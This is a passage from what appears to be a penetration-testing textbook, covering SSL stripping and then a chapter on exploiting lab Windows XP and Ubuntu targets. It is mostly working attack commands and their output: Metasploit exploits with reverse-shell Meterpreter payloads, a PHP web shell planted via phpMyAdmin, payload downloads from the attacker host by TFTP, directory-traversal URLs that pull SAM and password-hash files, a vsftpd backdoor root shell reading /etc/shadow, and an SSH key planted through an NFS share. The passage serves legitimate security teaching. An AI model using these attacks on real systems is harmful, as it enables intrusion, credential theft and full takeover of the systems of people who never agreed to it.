Arpspoof and\nspoof the default gateway. (For instructions, jump back to “Using ARP\nCache Poisoning to Impersonate the Default Gateway” on page 165.)\nroot@kali:# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080\nNow start SSLstrip, and tell it to listen on port 8080 with the -l flag. root@kali:# sslstrip -l 8080\nNext, browse to a site that uses SSL (try any Internet site that requires\nlogin credentials) from your Linux target, like the Twitter login page shown\nin Figure 7-15. As you can see, HTTP has replaced HTTPS in the address bar. When you log in, your credentials will be reported in plaintext by SSLstrip. (No, my Twitter password isn’t really “password.”)\nThis attack is more sophisticated than a straight SSL man-in-the-middle\nattack. We are able to avoid the certificate warning because the server is\ncompleting an SSL connection with SSLstrip rather than the browser. 2015-12-28 19:16:35,323 SECURE POST Data (twitter.com):\nsession%5Busername_or_email%5D=georgiaweidman&session%5Bpassword%5D=password&s\ncribe_log=&redirect_after_login=%2F&authenticity_token=a26a0faf67c2e11e6738053\nc81beb4b8ffa45c6a\nAs you can see, SSLstrip reports the entered credentials (georgiaweidman:\npassword) in plaintext. 174 Chapter 7\nFigure 7-15: Twitter login page with SSLstrip running\nsummary\nIn this chapter we’ve fiddled with network traffic to create some interesting\nresults. Using various tools and techniques, we were able to intercept traffic\nthat we had no business seeing in a switched network. We used ARP cache\npoisoning to redirect traffic in a switched network to our Kali system and\nDNS cache poisoning to redirect users to our web servers. We used Ettercap\nto automate an SSL man-in-the-middle attack and (assuming that the user\nclicks through a warning) capture sensitive information in plaintext. Finally,\nwe made the attack even more sophisticated by avoiding an invalid certifi-\ncate warning using SSL stripping. Capturing traffic from the local network can glean useful information\nfor our pentest. For example, we were able to capture valid credentials for\nthe FTP server for use in exploitation. Speaking of exploitation, let’s get started. Capturing Traffic 175\nPaRT III\nat taCks\n8\ne xPloitation\nAfter all that preparatory work we finally get to the\nfun stuff: exploitation. In the exploitation phase of\nthe pentest, we run exploits against the vulnerabilities\nwe have discovered to gain access to target systems. Some vulnerabilities, such as the use of default pass-\nwords, are so easy to exploit, it hardly feels like exploi-\ntation at all. Others are much more complicated. In this chapter we’ll look at exploiting the vulnerabilities we identified in\nChapter 6 to gain a foothold in target machines. We’ll return to our friend\nMS08-067 from Chapter 4, now that we have more background about the\nvulnerability. We’ll also exploit an issue in the SLMail POP3 server with a\nMetasploit module. In addition, we’ll piggyback on a previous compromise\nand bypass login on the FTP server on our Linux target. We will exploit\na vulnerability in the TikiWiki install on the Linux target and a couple of\ndefault password issues on an XAMPP install on the Windows target. We’ll\nalso take advantage of a readable and writable NFS share to take control of\nthe SSH keys and log in as a valid user without knowing the password. We\nwill interact with a fragile web server on a nonstandard port to take advan-\ntage of a directory traversal issue and download system files. For a refresher\non how we discovered each of the issues we’ll use for exploitation, refer\nback to Chapter 6. revisiting ms08-067\nWe know from Chapter 6 that the SMB server on our Windows XP target is\nmissing the MS08-067 patch.\n\nThe MS08-067 vulnerability has a good repu-\ntation for successful exploits, and the corresponding Metasploit module is\nranked as great. We used this vulnerability as an example in Chapter 4, but\nthe knowledge we gained in the previous chapters gives us solid evidence\nthat this exploit will result in a compromise. When we viewed the options for the windows/smb/ms08_067_netapi mod-\nule in Chapter 4, we saw the usual RHOST and RPORT as well as SMBPIPE, which\nallows us to set the pipe that our exploit will use. The default is the browser\npipe, though we can also use SRVSRC. In Chapter 4, we ran the Metasploit\nmodule scanner/smb/pipe_auditor to enumerate the listening SMB pipes\nand found that only the browser pipe is available. Thus, we know that the\ndefault SMBPIPE option, BROWSER, is the only one that will work. Metasploit Payloads\nAs we discussed in Chapter 4, payloads allow us to tell an exploited system\nto do things on our behalf. Though many payloads are either bind shells,\nwhich listen on a local port on the target machine, or reverse shells, which\ncall back to a listener on the attack system, other payloads perform specific\nfunctions. For example, if you run the payload osx/armle/vibrate on an iPhone,\nthe phone will vibrate. There are also payloads to add a new user account:\nlinux/x86/adduser for Linux systems and windows/adduser for Windows. We can download and execute a file with windows/download_exec_https or\nexecute a command with windows/exec. We can even use the speech API to\nmake the target say “Pwned” with windows/speak_pwned. Recall that we can see all the payloads available in Metasploit by enter-\ning show payloads at the root of Msfconsole. Enter this command after you\ntell Metasploit to use the windows/smb/ms08_067_netapi module so you can\nsee only payloads that are compatible with the MS08-067 exploit. In Chapter 4, we used windows/shell_reverse_tcp, but looking through the\nlist, we also see a payload called windows/shell/reverse_tcp. windows/shell/reverse_tcp normal Windows Command Shell, Reverse TCP Stager\nwindows/shell_reverse_tcp normal Windows Command Shell, Reverse TCP Inline\n180 Chapter 8\nBoth payloads create Windows command shells using a reverse connec-\ntion (discussed in Chapter 4). The exploited machine will connect back to\nour Kali machine at the IP address and port specified in the payload options. Any of the payloads listed for the windows/smb/ms08_067_netapi will work just\nfine, but in different pentesting scenarios, you may have to get creative. Staged Payloads\nThe windows/shell/reverse_tcp payload is staged. If we use it with the windows/\nsmb/ms08_067_netapi exploit, the string sent to the SMB server to take\ncontrol of the target machine does not contain all of the instructions to\ncreate the reverse shell. Instead, it contains a stager payload with just enough\ninformation to connect back to the attack machine and ask Metasploit for\ninstructions on what to do next. When we launch the exploit, Metasploit\nsets up a handler for the windows/shell/reverse_tcp payload to catch the incom-\ning reverse connection and serve up the rest of the payload—in this case\na reverse shell—then the completed payload is executed, and Metasploit’s\nhandler catches the reverse shell. The amount of memory space available for\na payload may be limited, and some advanced Metasploit payloads can take\nup a lot of space. Staged payloads allow us to use complex payloads without\nrequiring a lot of space in memory. Inline Payloads\nThe windows/shell_reverse_tcp payload is an inline, or single, payload. Its\nexploit string contains all the code necessary to push a reverse shell back\nto the attacker machine. Though inline payloads take up more space\nthan staged payloads, they are more stable and consistent because all\nthe instructions are included in the original exploit string. You can dis-\ntinguish inline and staged payloads by the syntax of their module name. For example, windows/shell/reverse_tcp or windows/meterpreter/bind_tcp are\nstaged, whereas windows/shell_reverse_tcp is inline. Meterpreter\nMeterpreter is a custom payload written for the Metasploit Project. It is\nloaded directly into the memory of an exploited process using a technique\nknown as reflective dll injection. As such, Meterpreter resides entirely in mem-\nory and writes nothing to the disk. It runs inside the memory of the host\nprocess, so it doesn’t need to start a new process that might be noticed by an\nintrusion prevention or intrusion detection system (IPS/IDS). Meterpreter\nalso uses Transport Layer Security (TLS) encryption for communication\nbetween it and Metasploit. You can think of Meterpreter as a kind of shell\nand then some. It has additional useful commands that we can use, such as\nhashdump, which allows us to gain access to local Windows password hashes. (We’ll look at many Meterpreter commands when we study post exploita-\ntion in Chapter 13.)\nExploitation 181\nWe saw in Chapter 4 that Metasploit’s default payload for the windows/\nsmb/ms08_067_netapi is windows/meterpreter/reverse_tcp. Let’s use the windows/\nmeterpreter/reverse_tcp payload with our MS08-067 exploit this time. Our pay-\nload options should be familiar from other reverse payloads we have used\nso far. Let’s set our payload and run the exploit, as shown in Listing 8-1. msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcp\npayload => windows/meterpreter/reverse_tcp\nmsf exploit(ms08_067_netapi) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(ms08_067_netapi) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Automatically detecting the target... [*] Fingerprint: Windows XP - Service Pack 3 - lang:English\n[*] Selected Target: Windows XP SP3 English (AlwaysOn NX)\n[*] Attempting to trigger the vulnerability... [*] Sending Stage to 192.168.20.10... [*] Meterpreter session 1 opened (192.168.20.9:4444 -> 192.168.20.10:4312) at\n2015-01-12 00:11:58 -0500\nListing 8-1: Exploiting MS08-067 with a Meterpreter payload\nAs the output shows, running this exploit should open a Meterpreter\nsession that we’ll be able to use for post exploitation. exploiting webdaV default Credentials\nIn Chapter 6, we found that the XAMPP installation on our Windows XP\ntarget employs default login credentials for the WebDAV folder used to\nupload files to the web server. This issue allows us to upload our own pages\nto the server with Cadaver, a command line client for WebDAV, which we\nused to verify this vulnerability in Chapter 6. Let’s create a simple test file\nto upload:\nroot@kali:~# cat test.txt\ntest\nNow use Cadaver with the credentials wampp:xampp to authenticate\nwith WebDAV. root@kali:~# cadaver http://192.168.20.10/webdav\nAuthentication required for XAMPP with WebDAV on server `192.168.20.10':\nUsername: wampp\nPassword:\ndav:/webdav/>\nFinally, use WebDAV’s put command to upload our test.txt file to the web\nserver. 182 Chapter 8\ndav:/webdav/> put test.txt\nUploading test.txt to `/webdav/test.txt':\nProgress: [=============================>] 100.0% of 5 bytes succeeded. dav:/webdav/>\nIf you browse to /webdav/test.txt, you should see that we have successfully\nuploaded our text file to the website, as shown in Figure 8-1. Figure 8-1: A file uploaded with WebDAV\nRunning a Script on the Target Web Server\nA text file is not very useful to us; it would be better if we could upload a\nscript and execute it on the web server, allowing us to run commands on\nthe underlying system’s Apache web server. If Apache is installed as a system\nservice, it will have system-level privileges, which we could use to gain maxi-\nmum control over our target. If not, Apache will run with privileges of the\nuser who started it. Either way, you should end up with a good deal of con-\ntrol over the underlying system just by dropping a file on the web server. Let’s start by confirming that our WebDAV user is allowed to upload\nscripts to the server. Because we found phpMyAdmin software on this web\nserver in Chapter 6, we know that the XAMPP software includes PHP. If we\nupload and execute a PHP file, we should be able to run commands on the\nsystem using PHP. dav:/webdav/> put test.php\nUploading test.php to `/webdav/test.php':\nProgress: [=============================>] 100.0% of 5 bytes succeeded. dav:/webdav/>\nnote Some open WebDAV servers allow uploading text files but block script files like .asp or\n.php. Lucky for us, that isn’t the case here, and we successfully uploaded test.php. Uploading a Msfvenom Payload\nIn addition to uploading any PHP scripts we’ve created to perform tasks on\nthe target, we can also use Msfvenom to generate a stand-alone Metasploit\npayload to upload to the server. We used Msfvenom briefly in Chapter 4,\nbut to brush up on syntax, you can enter msfvenom -h for help. When you’re\nready, list all the available payloads with the -l option for PHP payloads, as\nshown in Listing 8-2. Exploitation 183\nroot@kali:~# msfvenom -l payloads\nphp/bind_perlu Listen for a connection and spawn a command\nshell via perl (persistent)\nphp/bind_perl_ipv6 Listen for a connection and spawn a command\nshell via perl (persistent) over IPv6\nphp/bind_php Listen for a connection and spawn a command\nshell via php\nphp/bind_php_ipv6 Listen for a connection and spawn a command\nshell via php (IPv6)\nphp/download_execv Download an EXE from an HTTP URL and execute it\nphp/exec Execute a single system command\nphp/meterpreter/bind_tcpw Listen for a connection over IPv6, Run a\nmeterpreter server in PHP\nphp/meterpreter/reverse_tcp Reverse PHP connect back stager with checks\nfor disabled functions, Run a meterpreter\nserver in PHP\nphp/meterpreter_reverse_tcp Connect back to attacker and spawn a\nMeterpreter server (PHP)\nphp/reverse_perl Creates an interactive shell via perl\nphp/reverse_php Reverse PHP connect back shell with checks\nfor disabled functions\nphp/shell_findsock\nListing 8-2: Metasploit PHP payloads\nMsfvenom gives us a few options: We can download and execute a file on\nthe system v, create a shell u, or even use Meterpreter w. Any of these pay-\nloads will give us control of the system, but let’s use php/meterpreter/reverse_tcp. After we specify a payload, we can use -o to find out which options we need to\nuse with it, as shown here. root@kali:~# msfvenom -p php/meterpreter/reverse_tcp -o\n[*] Options for payload/php/meterpreter/reverse_tcp\n--snip--\nName Current Setting Required Description\n---- --------------- -------- -----------\nLHOST yes The listen address\nLPORT 4444 yes The listen port\nAs you can see we need to set LHOST to tell the payload which IP\naddress to connect back to, and we can also change the LPORT option. Because this payload is already in PHP format, we can output it in the\nraw format with the -f option after we set our options, and then pipe\nthe raw PHP code into a file with the .php extension for posting to the\nserver, as shown here. root@kali:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.20.9\nLPORT=2323 -f raw > meterpreter.php\n184 Chapter 8\nNow we upload the file using WebDAV. dav:/webdav/> put meterpreter.php\nUploading meterpreter.php to `/webdav/meterpreter.php':\nProgress: [=============================>] 100.0% of 1317 bytes succeeded. As in Chapter 4, we need to set up a handler in Msfconsole to catch the\npayload before we execute the script (see Listing 8-3).\n\nmsf > use multi/handler\nmsf exploit(handler) > set payload php/meterpreter/reverse_tcpu\npayload => php/meterpreter/reverse_tcp\nmsf exploit(handler) > set LHOST 192.168.20.9v\nlhost => 192.168.20.9\nmsf exploit(handler) > set LPORT 2323w\nlport => 2323\nmsf exploit(handler) > exploit\n[*] Started reverse handler on 192.168.20.9:2323\n[*] Starting the payload handler... Listing 8-3: Setting up the payload handler\nUse multi/handler in Msfconsole, set the payload to php/meterpreter/\nreverse_tcp u, and set LHOST v and LPORT w appropriately to match the\ngenerated payload. If this process is unfamiliar to you, jump back to the\n“Creating Standalone Payloads with Msfvenom” on page 103. Running the uploaded payload by opening it in a web browser should\nprovide us with a Meterpreter session that we can see when we return to\nMsfconsole, as shown here. [*] Sending stage (39217 bytes) to 192.168.20.10\n[*] Meterpreter session 2 opened (192.168.20.9:2323 -> 192.168.20.10:1301) at\n2015-01-07 17:27:44 -0500\nmeterpreter >\nWe can use the Meterpreter command getuid to see what privileges our\nsession has on the exploited target. Generally speaking, we get the privi-\nleges of the software we exploited. meterpreter > getuid\nBOOKXP\\SYSTEM\nWe now have system privileges, which will allow us to take complete\ncontrol of the Windows system. (It’s generally a bad idea to allow web server\nsoftware to have system privileges for just this reason. Because XAMPP’s\nApache server is running as a system service, we have full access to the\nunderlying system.)\nNow let’s look at another issue with our XAMPP install. Exploitation 185\nexploiting open phpmyadmin\nThe same target XAMPP platform exploited in the previous section also\nincludes an open phpMyAdmin install, which we can exploit to run com-\nmands on the database server. Like Apache, our MySQL server will have\neither system privileges (if it is installed as a Windows service) or the privi-\nleges of the user that started the MySQL process. By accessing the MySQL\ndatabase, we can perform an attack similar to our WebDAV attack and\nupload scripts to the web server using MySQL queries. To explore this attack, first navigate to http://192.168.20.10/phpmyadmin,\nand click the SQL tab at the top. We’ll use MySQL to write a script to the\nweb server that we’ll use to get a remote shell. We’ll use a SQL SELECT\nstatement to output a PHP script to a file on the web server, which will\nallow us to remotely control the target system. We’ll use the script <?php\nsystem($_GET['cmd']); ?> to grab the cmd parameter from the URL and exe-\ncute it using the system() command. The default install location for XAMPP’s Apache on Windows is\nC:\\xampp\\htodcs\\. The syntax for our command is: SELECT \"<script string>\"\ninto outfile \"path_to_file_on_web_server\". Our completed command looks\nlike this:\nSELECT \"<?php system($_GET['cmd']); ?>\" into outfile \"C:\\\\xampp\\\\htdocs\\\\shell.php\"\nnote We use double backslashes to escape, so we don’t end up with the file\nC:xampphtdocsshell.php, which we will not be able to access from\nthe web server. Figure 8-2 shows the command entered into the SQL console in\nphpMyAdmin. Figure 8-2: Executing SQL commands\n186 Chapter 8\nRun the completed query in phpMyAdmin, and then browse to the\nnewly created file, http://192.168.20.10/shell.php. The script should throw the\nerror Warning: system() [function.system]: Cannot execute a blank command in C:\\\nxampp\\htdocs\\shell.php on line 1, because we did not supply an cmd parameter. (Recall from earlier that shell.php grabs the cmd parameter from the URL\nand runs it using the PHP system() command.) We need to supply a cmd\nparameter that tells the script the command we’d like to run on the target\nsystem. For example, we can ask the Windows XP target to tell us its net-\nworking information using ipconfig as the cmd parameter, like so:\nhttp://192.168.20.10/shell.php?cmd=ipconfig\nThe result is shown in Figure 8-3. Figure 8-3: Code execution\nDownloading a File with TFTP\nThe previous steps give us a shell with system privileges, which we “upgrade”\nby uploading a more complicated PHP script. But rather than creating a\nreally long and complicated SQL SELECT query, we can host a file on our\nKali machine and then use our PHP shell to pull it down to the web server. On Linux, we could use wget to download files from the command line. This functionality is painfully absent on Windows, but we can use TFTP on\nWindows XP. Let’s use it to upload meterpreter.php from the previous section. note TFTP is not the only way we can transfer files with noninteractive command line\naccess. In fact, some newer Windows systems do not have TFTP enabled by default. You can also have FTP read settings from a file with the -s option or use a script-\ning language such as Visual Basic or Powershell on the latest Windows operating\nsystems. We can use the Atftpd TFTP server to host files on our Kali system. Start Atftpd in daemon mode, serving files from the location of your\nmeterpreter.php script. root@kali:~# atftpd --daemon --bind-address 192.168.20.9 /tmp\nSet the cmd parameter in the shell.php script as follows:\nhttp://192.168.20.10/shell.php?cmd=tftp 192.168.20.9 get meterpreter.php\nC:\\\\xampp\\\\htdocs\\\\meterpreter.php\nExploitation 187\nThis command should pull down meterpreter.php to the target’s Apache\ndirectory using TFTP, as shown in Figure 8-4. Figure 8-4: Transferring files with TFTP\nNow we can browse to http://192.168.20.10/meterpreter.php to open a\nMeterpreter shell. (Be sure to restart the handler to catch the Meterpreter\nconnection before executing the script.) And as you can see, though we\nused an attack different from uploading a file through WebDAV, we ended\nup in the same place: We have a Meterpreter shell from the web server\nusing its access to the MySQL server to upload files. Now let’s look at attacking the other web server on the Windows XP\nsystem. note This is not the only way we could exploit database access. For example, if you find a\nMicrosoft MS SQL database instead, you may be able to use the xp_cmdshell() func-\ntion, which acts as a built-in system command shell. For security reasons, it is disabled\non newer versions of MS SQL, but a user with administrative privileges should be\nable to reenable it, giving you shell access without having to upload anything. downloading sensitive Files\nRecall from Chapter 6 that our Zervit server on port 3232 has a directory\ntraversal issue that will allow us to download files from the remote system\nwithout authentication. We can download the Windows boot.ini configura-\ntion file (and other files, too) through the browser with the following URL:\nhttp://192.168.20.10:3232/index.html?../../../../../../boot.ini\nWe’ll use this ability to pull files containing password hashes (encrypted\npasswords) for Windows, as well as installed services. Downloading a Configuration File\nThe default install location for XAMPP is C:\\xampp, so we can expect the\ndirectory for FileZilla FTP server to be at C:\\xampp\\FileZillaFtp. A little\nonline research on FileZilla tells us that it stores MD5 hashes of passwords\nin the FileZilla Server.xml configuration file. Depending on the strength of\nthe FTP passwords stored in this file, we may be able to use the MD5 hash\nvalue to recover users’ plaintext FTP passwords. We captured the password for user georgia in Chapter 7, but our target\nmay contain additional accounts. Let’s use the Zervit server to download\nthe FileZilla configuration file from http://192.168.20.10:3232/index.html? ../../../../../../xampp/FileZillaFtp/FileZilla%20Server.xml. (Note that %20 is\n188 Chapter 8\nhex encoding for a space.) You can see some of the contents of the file in\nListing 8-4. <User Name=\"georgia\">\n<Option Name=\"Pass\">5f4dcc3b5aa765d61d8327deb882cf99</Option>\n<Option Name=\"Group\"/>\n<Option Name=\"Bypass server userlimit\">0</Option>\n<Option Name=\"User Limit\">0</Option>\n<Option Name=\"IP Limit\">0</Option>\n--snip--\nListing 8-4: FileZilla FTP configuration file\nAs you can see, the configuration file contains two user accounts (in\nthe User Name fields): georgia and newuser. Now all we have to do is figure\nout their passwords based on the stored hashes. We’ll look at turning password hashes back into plaintext passwords\n(including MD5 hashes) in the next chapter. Downloading the Windows SAM\nSpeaking of passwords, in addition to the FTP user passwords, we can try\npulling down the Windows Security Accounts Manager (SAM) file that stores\nWindows hashes. The SAM file is obfuscated because the Windows Syskey\nutility encrypts the password hashes inside the SAM file with 128-bit Rivest\nCipher 4 (RC4) to provide additional security. Even if an attacker or pen-\ntester is able to gain access to the SAM file, there is a bit more work to do to\nrecover the password hashes. We need a key to reverse the RC4 encryption\non the hashes. The encryption key for the Syskey utility, called the bootkey,\nis stored inside of the Windows SYSTEM file. We need to download both\nthe SAM and SYSTEM files to recover the hashes and attempt to reverse\nthem into plaintext passwords. In Windows XP, these files are located at\nC:\\Windows\\System32\\config, so let’s try downloading the SAM file from the\nfollowing URL:\nhttp://192.168.20.10:3232/index.html?../../../../../../WINDOWS/system32/config/sam\nWhen we try to use Zervit to download this file, we get a “file not\nfound” error. It looks like our Zervit server doesn’t have access to this file. Luckily, Windows XP backs up both the SAM and SYSTEM files to the\nC:\\Windows\\repair directory, and if we try to pull down the files from there,\nZervit is able to serve them. These URLs should do the trick:\nhttp://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/system\nhttp://192.168.20.10:3232/index.html?../../../../../../WINDOWS/repair/sam\nnote Like our MD5 hashes, we’ll use the Windows SAM file in the next chapter when we\ncover password attacks in depth. Exploitation 189\nexploiting a Buffer overflow in third-Party software\nIn Chapter 6, we never did find out for sure if the SLMail server on our\nWindows XP target is vulnerable to the POP3 issue CVE-2003-0264. The\nversion number reported by SLMail (5.5) appears to line up with the vul-\nnerability, so let’s try exploiting it. The corresponding Metasploit module,\nwindows/pop3/seattlelab_pass, has a rank of great. (A ranking that high is\nunlikely to crash the service if it fails.)\nWindows/pop3/seattlelab_pass attempts to exploit a buffer overflow in the\nPOP3 server. Using it is similar to setting up the MS08-067 exploit, as shown\nin Listing 8-5.\n\nmsf > use windows/pop3/seattlelab_pass\nmsf exploit(seattlelab_pass) > show payloads\nCompatible Payloads\n===================\nName Disclosure Date Rank Description\n---- --------------- ---- -----------\ngeneric/custom normal Custom Payload\ngeneric/debug_trap normal Generic x86 Debug Trap\n--snip--\nmsf exploit(seattlelab_pass) > set PAYLOAD windows/meterpreter/reverse_tcp\nPAYLOAD => windows/meterpreter/reverse_tcp\nmsf exploit(seattlelab_pass) > show options\nModule options (exploit/windows/pop3/seattlelab_pass):\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST 192.168.20.10 yes The target address\nRPORT 110 yes The target port\nPayload options (windows/meterpreter/reverse_tcp):\nName Current Setting Required Description\n---- --------------- -------- -----------\nEXITFUNC thread yes Exit technique: seh, thread, process, none\nLHOST yes The listen address\nLPORT 4444 yes The listen port\nExploit target:\nId Name\n-- ----\n0 Windows NT/2000/XP/2003 (SLMail 5.5)\nmsf exploit(seattlelab_pass) > set RHOST 192.168.20.10\nRHOST => 192.168.20.10\n190 Chapter 8\nmsf exploit(seattlelab_pass) > set LHOST 192.168.20.9\nLHOST => 192.168.20.9\nmsf exploit(seattlelab_pass) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Trying Windows NT/2000/XP/2003 (SLMail 5.5) using jmp esp at 5f4a358f\n[*] Sending stage (752128 bytes) to 192.168.20.10\n[*] Meterpreter session 4 opened (192.168.20.9:4444 -> 192.168.20.10:1566) at 2015-01-07\n19:57:22 -0500\nmeterpreter >\nListing 8-5: Exploiting SLMail 5.5 POP3 with Metasploit\nRunning this exploit should give us another Meterpreter session on\nthe Windows XP target—yet another way to take control of the system. (In Chapter 13, which covers post exploitation, we’ll see what to do once\nwe have a Meterpreter session on a target.)\nexploiting third-Party web applications\nIn Chapter 6, we used the Nikto web scanner against our Linux target and\ndiscovered an installation of the TikiWiki CMS software version 1.9.8 with\na code execution vulnerability in the script graph_formula.php. A search for\nTikiWiki in Metasploit returns several modules, as shown in Listing 8-6. msf exploit(seattlelab_pass) > search tikiwiki\nMatching Modules\n================\nName Disclosure Date Rank Description\n---- --------------- ---- -----------\n--snip--\nuexploit/unix/webapp/tikiwiki_graph_formula_exec 2007-10-10 00:00:00 UTC excellent TikiWiki graph_\nformula Remote\nPHP Code\nExecution\nexploit/unix/webapp/tikiwiki_jhot_exec 2006-09-02 00:00:00 UTC excellent TikiWiki jhot\nRemote Command\nExecution\n--snip--\nmsf exploit(seattlelab_pass) > info unix/webapp/tikiwiki_graph_formula_exec\nName: TikiWiki tiki-graph_formula Remote PHP Code Execution\nModule: exploit/unix/webapp/tikiwiki_graph_formula_exec\n--snip--\nTikiWiki (<= 1.9.8) contains a flaw that may allow a remote attacker\nto execute arbitrary PHP code. The issue is due to\n'tiki-graph_formula.php' script not properly sanitizing user input\nsupplied to create_function(), which may allow a remote attacker to\nexecute arbitrary PHP code resulting in a loss of integrity. Exploitation 191\nReferences:\nhttp://cve.mitre.org/cgi-bin/cvename.cgi?name=2007-5423\nhttp://www.osvdb.org/40478v\nhttp://www.securityfocus.com/bid/26006\nListing 8-6: TikiWiki exploit information\nBased on the module names, unix/webapp/tikiwiki_graph_formula_exec u\nlooks like the one we need because it has graph_formula in its name. Our\nassumption is confirmed when we run info on the module. The OSVDB\nnumber v listed in the references for unix/webapp/tikiwiki_graph_formula_\nexec matches our Nikto output from Chapter 6. The options for this module are different from our previous exploit\nexamples, as shown in Listing 8-7. msf exploit(seattlelab_pass) > use unix/webapp/tikiwiki_graph_formula_exec\nmsf exploit(tikiwiki_graph_formula_exec) > show options\nModule options (exploit/unix/webapp/tikiwiki_graph_formula_exec):\nName Current Setting Required Description\n---- --------------- -------- -----------\nProxies no Use a proxy chainu\nRHOST yes The target address\nRPORT 80 yes The target port\nURI /tikiwiki yes TikiWiki directory pathv\nVHOST no HTTP server virtual hostw\nExploit target:\nId Name\n-- ----\n0 Automatic\nmsf exploit(tikiwiki_graph_formula_exec) > set RHOST 192.168.20.11\nRHOST => 192.168.20.11\nListing 8-7: Using the TikiWiki exploit\nWe could set a proxy chain u and/or a virtual host w for the TikiWiki\nserver, but we don’t need to here. We can leave the URI set to the default\nlocation /tikiwiki v. This exploit involves PHP command execution, so naturally, our\npayloads are PHP based. Using the show payloads command (Listing 8-8)\nreveals that we can use PHP-based Meterpreter u as we did in our XAMPP\nexploit. We will also need to set our LHOST option v again. 192 Chapter 8\nmsf exploit(tikiwiki_graph_formula_exec) > set payload php/meterpreter/reverse_tcpu\npayload => php/meterpreter/reverse_tcp\nmsf exploit(tikiwiki_graph_formula_exec) > set LHOST 192.168.20.9v\nLHOST => 192.168.20.110\nmsf exploit(tikiwiki_graph_formula_exec) > exploit\n[*] Started reverse handler on 192.168.20.9:4444\n[*] Attempting to obtain database credentials... [*] The server returned : 200 OK\n[*] Server version : Apache/2.2.9 (Ubuntu) PHP/5.2.6-2ubuntu4.6 with Suhosin-Patch\n[*] TikiWiki database informations :\ndb_tiki : mysql\ndbversion : 1.9\nhost_tiki : localhost\nuser_tiki : tikiw\npass_tiki : tikipassword\ndbs_tiki : tikiwiki\n[*] Attempting to execute our payload... [*] Sending stage (39217 bytes) to 192.168.20.11\n[*] Meterpreter session 5 opened (192.168.20.9:4444 -> 192.168.20.11:54324) at 2015-01-07\n20:41:53 -0500\nmeterpreter >\nListing 8-8: Exploiting TikiWiki with Metasploit\nAs you can see, while exploiting the TikiWiki installation, the Meta-\nsploit module discovered the credentials w for the TikiWiki database. Unfortunately, the MySQL server is not listening on the network, so these\ncredentials cannot be used for additional compromise. Still, we should note\nthem because they might come in handy during post exploitation. exploiting a Compromised service\nWe noted in Chapter 6 that the FTP server on the Linux target serves a ban-\nner for Very Secure FTP 2.3.4, the version replaced with a binary containing\na backdoor. Because the official code was eventually restored by the authors\nof Vsftpd, the only way to find out if the server on our Linux target has the\nbackdoor code is to test it. (We don’t need to worry about potentially crash-\ning the service if it’s not vulnerable: If this server doesn’t have the backdoor\ncode, we’ll just get a login error when we use the smiley face.)\nEnter any username you like, and add a :) at the end (see Listing 8-9). Use anything for the password, as well. If the backdoor is present, it will\ntrigger without valid credentials. root@kali:~# ftp 192.168.20.11\nConnected to 192.168.20.11. 220 (vsFTPd 2.3.4)\nExploitation 193\nName (192.168.20.11:root): georgia:)\n331 Please specify the password. Password:\nListing 8-9: Triggering the Vsftpd backdoor\nWe notice that the login hangs after the password. This tells us that the\nFTP server is still processing our login attempt, and if we query the FTP\nport again, it will continue to respond. Let’s use Netcat to try connecting\nto port 6200, where the root shell should spawn if the backdoor is present. root@kali:~# nc 192.168.20.11 6200\n# whoami\nroot\nSure enough, we have a root shell. Root privileges give us total control of\nour target machine. For example, we can get the system password hashes with\nthe command cat /etc/shadow. Save the password hash for the user georgia\n(georgia:$1$CNp3mty6$|RWcT0/PVYpDKwyaWWkSg/:15640:0:99999:7:::)to a\nfile called linuxpasswords.txt. We will attempt to turn this hash into a plain-\ntext password in Chapter 9. exploiting open nFs shares\nAt this point we know that the Linux target has exported user georgia’s\nhome folder using NFS and that that share is available to anyone without\nthe need for credentials. But this might not carry much security risk if we\ncannot use the access to read or write sensitive files. Recall that when we scanned the NFS mount in Chapter 6, we saw the\n.ssh directory. This directory could contain the user’s private SSH keys as\nwell as keys used for authenticating a user over SSH. Let’s see if we can\nexploit this share. Start by mounting the NFS share on your Kali system. root@kali:~# mkdir /tmp/mount\nroot@kali:~# mount -t nfs -o nolock 192.168.20.11:/export/georgia /tmp/mount\nThis doesn’t look too promising at first glance because georgia has no\ndocuments, pictures, or videos—just some simple buffer overflow examples\nwe will use in Chapter 16. There doesn’t appear to be any sensitive infor-\nmation here, but before we jump to conclusions, let’s see what’s in the .ssh\ndirectory. root@kali:~# cd /tmp/mount/.ssh\nroot@kali:/tmp/mount/.ssh# ls\nauthorized_keys id_rsa id_rsa.pub\nWe now have access to georgia’s SSH keys. The id_rsa file is her private\nkey, and id_rsa.pub is her corresponding public key. We can read or even\nchange these values, and we can write to the SSH file authorized_keys, which\n194 Chapter 8\nhandles a list of SSH public keys that are authorized to log in as the user\ngeorgia. And because we have write privileges, we can add our own key here\nthat will allow us to bypass password authentication when logging in to the\nUbuntu target as georgia, as shown in Listing 8-10. root@kali:~# ssh-keygen\nGenerating public/private rsa key pair. Enter file in which to save the key (/root/.ssh/id_rsa):\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in /root/.ssh/id_rsa. Your public key has been saved in /root/.ssh/id_rsa.pub. The key fingerprint is:\n26:c9:b7:94:8e:3e:d5:04:83:48:91:d9:80:ec:3f:39 root@kali\nThe key's randomart image is:\n+--[ RSA 2048]----+\n| . o+B . |\n--snip--\n+-----------------+\nListing 8-10: Generating a new SSH key pair\nFirst, we generate a key on our Kali machine using ssh-keygen.\n\nBy\ndefault our new public key is written to /root/.ssh/id_rsa.pub, and our pri-\nvate key is written to /root/.ssh/id_rsa. We want to add our public key to the\nauthorized_keys file for georgia on Ubuntu. Next, let’s append the newly generated public key to georgia’s authorized_\nkeys file. cat out the contents of the /root/.ssh/id_rsa.pub file, and append it to\ngeorgia’s authorized_keys file. root@kali:~# cat ~/.ssh/id_rsa.pub >> /tmp/mount/.ssh/authorized_keys\nWe should now be able to SSH into the Linux target as georgia. Let’s\ngive it a try. root@kali:~# ssh georgia@192.168.20.11\ngeorgia@ubuntu:~$\nThat worked nicely. We can now successfully authenticate with the\nLinux target using public key authentication. We could also have gained access by copying georgia’s key to the Kali\nmachine. To do so, we first delete the SSH identity we created. root@kali:/tmp/mount/.ssh# rm 